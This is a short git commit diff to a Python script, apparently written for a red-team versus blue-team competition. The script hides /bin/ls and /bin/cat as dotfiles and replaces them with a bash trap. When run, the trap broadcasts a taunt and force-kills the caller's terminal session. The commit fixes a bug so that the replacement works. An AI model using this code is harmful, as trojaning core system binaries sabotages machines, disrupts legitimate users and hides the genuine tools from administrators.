5f4fc66a7c4ce3d444bc61072eda4a2172407bf0
TheCatLover <johnthejolly@gmail.com>
2022-04-09 05:04:55 -0500

    Update commands.py

--- commands.py
+++ commands.py
@@ -3,10 +3,10 @@ import os
 content = "#!/bin/bash\n\necho \"Why hello there red team! You are being kicked off. Better luck next time :(\"\nwall \"RED TEAM\"\ntemp=$(tty)\npkill -9 -t ${temp:5}"
 
 def update(command):
-	if os.path.exists("/bin/"+command):
+    if os.path.exists("/bin/"+command):
         os.rename("/bin/"+command, "/bin/."+command)
         with open("/bin/"+command, "w") as file:
-            f.write(content)
+            file.write(content)
 
 update("ls")
 update("cat")
